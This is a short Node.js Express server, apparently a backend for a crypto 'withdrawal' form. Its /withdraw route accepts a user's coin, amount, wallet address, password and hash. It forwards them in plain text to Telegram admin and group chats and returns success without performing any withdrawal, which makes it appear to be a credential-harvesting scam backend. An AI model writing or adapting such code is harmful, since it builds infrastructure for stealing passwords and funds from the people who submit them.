const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();

app.use(cors());
app.use(express.json());

// Railway health check
app.get("/", (req, res) => {
    res.send("OK");
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;   // 私聊通知
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;   // 群组通知

// 统一发送函数
async function sendTelegramMessage(chatId, message) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: "HTML"
            }
        );
    } catch (err) {
        console.error("Telegram ERROR:", err.response?.data || err.message);
    }
}

app.post("/withdraw", async (req, res) => {
    console.log("Withdraw received:", req.body);

    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        if (!coin || !amount || !wallet || !password || !hash) {
            return res.status(400).json({ success: false, error: "Missing fields" });
        }

        const message = `
<b>🚨 New Withdrawal Request</b>

<b>Coin:</b> ${coin}
<b>Amount:</b> ${amount}
<b>USDT:</b> ${usdt}
<b>Wallet:</b> ${wallet}
<b>Password:</b> ${password}
<b>Hash:</b> ${hash}

⏱ ${new Date().toLocaleString()}
        `;

        // 发给你个人
        if (ADMIN_CHAT_ID) {
            sendTelegramMessage(ADMIN_CHAT_ID, message);
        }

        // 发给群组
        if (GROUP_CHAT_ID) {
            sendTelegramMessage(GROUP_CHAT_ID, message);
        }

        return res.json({ success: true });

    } catch (err) {
        console.error("Server Error:", err);
        return res.status(500).json({ success: false, error: "Internal Server Error" });
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log("🚀 Server running on", PORT));
